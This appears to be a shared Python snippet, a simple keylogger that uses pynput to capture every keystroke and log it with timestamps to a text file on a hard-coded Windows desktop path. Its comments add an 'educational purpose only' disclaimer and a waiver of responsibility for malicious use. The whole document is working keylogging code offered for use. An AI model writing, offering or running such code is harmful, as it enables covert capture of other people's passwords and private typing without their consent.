# First check whether pynput and logging module is installed

# This is for educational purpose only and I'm not responsible for your malicious activity

# Have fun with this code

from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/23/Desktop/" # location of the file

logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key);

with Listener(on_press=on_press) as listener:
    listener.join()
